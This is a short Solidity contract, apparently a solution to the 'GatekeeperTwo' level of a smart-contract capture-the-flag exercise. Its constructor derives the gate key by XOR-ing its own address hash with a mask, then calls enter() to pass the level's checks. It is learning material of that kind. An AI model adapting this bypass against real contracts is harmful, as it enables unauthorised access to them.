// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperTwo} from "../levels/GatekeeperTwo.sol";

contract GatekeeperTwoAttack {
    constructor(address gatekeeperTwoAddress) {
        GatekeeperTwo instance = GatekeeperTwo(gatekeeperTwoAddress);
        // x ^ y = z
        // x ^ z = y
        // z ^ y = x
        uint64 verifier = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 mask = type(uint64).max;
        uint64 gateKey = verifier ^ mask;
        instance.enter(bytes8(gateKey));
    }
}
